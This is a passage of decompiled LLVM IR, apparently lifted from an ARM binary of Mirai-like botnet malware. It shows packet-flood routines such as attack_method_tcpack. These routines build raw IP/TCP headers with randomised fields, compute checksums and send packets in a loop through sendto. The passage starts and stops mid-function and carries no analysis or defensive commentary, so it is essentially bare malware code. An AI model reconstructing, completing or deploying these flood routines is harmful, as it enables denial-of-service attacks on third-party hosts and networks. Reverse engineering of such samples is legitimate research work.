  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 20, 17, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 31, 32, 30, 33, 35, 34, 36, 37, 38, 40, 39, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bae4 = load i32, i32* @sb, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* %sb.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
